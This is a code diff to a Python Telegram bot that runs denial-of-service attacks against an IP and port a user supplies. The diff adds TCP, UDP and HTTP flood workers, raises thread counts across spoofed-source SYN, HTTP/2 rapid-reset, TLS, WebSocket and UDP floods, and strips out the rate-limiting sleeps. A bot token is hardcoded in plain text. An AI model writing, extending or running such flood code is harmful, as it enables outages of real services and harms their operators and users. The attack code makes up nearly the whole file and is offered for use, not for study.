@@ -4,13 +4,16 @@ import telebot
 from telebot import types
 
 BOT_TOKEN = "8603622469:AAHHcTA6oV4gbcyBTqlRRU7TRY_irCZR5_Q"
-TLS_THREADS = 200
-PARSER_THREADS = 150
-KEEPALIVE_THREADS = 200
-UDP_THREADS = 150
-SYN_THREADS = 100
-HTTP2_THREADS = 100
-WS_THREADS = 100
+TLS_THREADS = 500
+PARSER_THREADS = 400
+KEEPALIVE_THREADS = 500
+UDP_THREADS = 400
+SYN_THREADS = 300
+HTTP2_THREADS = 300
+WS_THREADS = 300
+TCP_FLOOD_THREADS = 500
+UDP_FLOOD_THREADS = 500
+HTTP_FLOOD_THREADS = 300
 
 logging.basicConfig(level=logging.INFO, stream=sys.stdout)
 logger = logging.getLogger(__name__)
@@ -39,6 +42,40 @@ def tls_hello_session():
     hello = b'\x16\x03\x01' + struct.pack(">H", 70) + b'\x03\x03' + rand + b'\x20' + sid + b'\x00\x04\xC0\x2B\xC0\x2F\x01\x00\x00\xFF\x01\x00'
     return hello
 
+def tcp_flood_worker(ip, port, stop_flag):
+    while not stop_flag.is_set():
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(0.3)
+            sock.connect((ip, port))
+            for _ in range(100):
+                sock.send(os.urandom(random.randint(1024, 65535)))
+            sock.close()
+        except:
+            pass
+
+def udp_flood_worker(ip, port, stop_flag):
+    while not stop_flag.is_set():
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            for _ in range(1000):
+                sock.sendto(os.urandom(random.randint(1024, 65507)), (ip, port))
+            sock.close()
+        except:
+            pass
+
+def http_flood_worker(ip, port, stop_flag):
+    while not stop_flag.is_set():
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(0.5)
+            sock.connect((ip, port))
+            for _ in range(50):
+                sock.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {random.choice(['Mozilla/5.0', 'Chrome/120', 'Safari/17'])}\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n".encode())
+            sock.close()
+        except:
+            pass
+
 def tls_worker(ip, port, stop_flag):
     idx = 0
     while not stop_flag.is_set():
@@ -52,7 +89,6 @@ def tls_worker(ip, port, stop_flag):
             sock.close()
         except:
             pass
-        time.sleep(0.0001)
 
 def parser_worker(ip, port, stop_flag):
     while not stop_flag.is_set():
@@ -65,11 +101,9 @@ def parser_worker(ip, port, stop_flag):
                     break
                 for ov in [True, False, True]:
                     sock.send(titan_packet(mt, overflow=ov))
-                    time.sleep(0.00001)
             sock.close()
         except:
             pass
-        time.sleep(0.0005)
 
 def keepalive_worker(ip, port, stop_flag):
     conns = []
@@ -81,33 +115,30 @@ def keepalive_worker(ip, port, stop_flag):
             sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
             sock.send(titan_packet(TITAN_MSG['KEEP_ALIVE']))
             conns.append(sock)
-            if len(conns) > 500:
-                for old in conns[:100]:
+            if len(conns) > 1000:
+                for old in conns[:200]:
                     try:
                         old.close()
                     except:
                         pass
-                conns = conns[100:]
+                conns = conns[200:]
         except:
             pass
-        time.sleep(0.001)
 
 def udp_worker(ip, port, stop_flag):
     while not stop_flag.is_set():
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            for _ in range(50):
+            for _ in range(500):
                 if stop_flag.is_set():
                     break
-                size = random.randint(2000, 32768)
+                size = random.randint(2000, 65507)
                 data = os.urandom(size)
                 for offset in range(0, size, 1400):
                     sock.sendto(data[offset:offset+1400], (ip, port))
-                    time.sleep(0.000001)
             sock.close()
         except:
             pass
-        time.sleep(0.00001)
 
 def syn_worker(ip, port, stop_flag):
     fake_ips = [f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}" for _ in range(100)]
@@ -120,11 +151,9 @@ def syn_worker(ip, port, stop_flag):
                 ip_hdr = struct.pack('!BBHHHBBH4s4s', (4 << 4) + 5, 0, 40, random.randint(1, 65535), 0, 64, socket.IPPROTO_TCP, 0, socket.inet_aton(fip), socket.inet_aton(ip))
                 tcp_hdr = struct.pack('!HHLLBBHHH', sp, port, random.randint(0, 4294967295), 0, (5 << 4), 2, 5840, 0, 0)
                 sock.sendto(ip_hdr + tcp_hdr, (ip, 0))
-                time.sleep(0.000001)
             sock.close()
         except:
             pass
-        time.sleep(0.0001)
 
 def http2_worker(ip, port, stop_flag):
     sid = 1
@@ -148,11 +177,9 @@ def http2_worker(ip, port, stop_flag):
                 rst = struct.pack(">I", 4)[1:] + b'\x03\x00' + struct.pack(">I", sid)[1:] + struct.pack(">I", 0)
                 ssock.send(rst)
                 sid += 2
-                time.sleep(0.000001)
             ssock.close()
         except:
             pass
-        time.sleep(0.0005)
 
 def ws_worker(ip, port, stop_flag):
     while not stop_flag.is_set():
@@ -181,11 +208,9 @@ def ws_worker(ip, port, stop_flag):
                     if mask_bit:
                         payload = bytes(b ^ mask_key[i % 4] for i, b in enumerate(payload))
                     sock.send(header + mask_key + payload)
-                    time.sleep(0.00001)
             sock.close()
         except:
             pass
-        time.sleep(0.001)
 
 class Attack:
     def __init__(self, ip, port):
@@ -194,7 +219,18 @@ class Attack:
         self.stop_flag = threading.Event()
         self.threads = []
     def start(self):
-        configs = [(tls_worker, TLS_THREADS), (parser_worker, PARSER_THREADS), (keepalive_worker, KEEPALIVE_THREADS), (udp_worker, UDP_THREADS), (syn_worker, SYN_THREADS), (http2_worker, HTTP2_THREADS), (ws_worker, WS_THREADS)]
+        configs = [
+            (tcp_flood_worker, TCP_FLOOD_THREADS),
+            (udp_flood_worker, UDP_FLOOD_THREADS),
+            (http_flood_worker, HTTP_FLOOD_THREADS),
+            (tls_worker, TLS_THREADS),
+            (parser_worker, PARSER_THREADS),
+            (keepalive_worker, KEEPALIVE_THREADS),
+            (udp_worker, UDP_THREADS),
+            (syn_worker, SYN_THREADS),
+            (http2_worker, HTTP2_THREADS),
+            (ws_worker, WS_THREADS),
+        ]
         for func, count in configs:
             for _ in range(count):
                 if self.stop_flag.is_set():
@@ -243,7 +279,7 @@ def attack_cmd(message):
     attack = Attack(ip, port)
     attack.start()
     active_attacks[cid] = attack
-    total = TLS_THREADS + PARSER_THREADS + KEEPALIVE_THREADS + UDP_THREADS + SYN_THREADS + HTTP2_THREADS + WS_THREADS
+    total = TCP_FLOOD_THREADS + UDP_FLOOD_THREADS + HTTP_FLOOD_THREADS + TLS_THREADS + PARSER_THREADS + KEEPALIVE_THREADS + UDP_THREADS + SYN_THREADS + HTTP2_THREADS + WS_THREADS
     bot.reply_to(message, f"АТАКА ЗАПУЩЕНА\n{ip}:{port}\nПотоков: {total}\n/stop")
 
 @bot.message_handler(func=lambda m: True)
@@ -253,4 +289,4 @@ def unknown_cmd(message):
 if __name__ == "__main__":
     logger.info("Бот запущен...")
     bot.remove_webhook()
-    bot.polling(none_stop=True) 
+    bot.polling(none_stop=True)
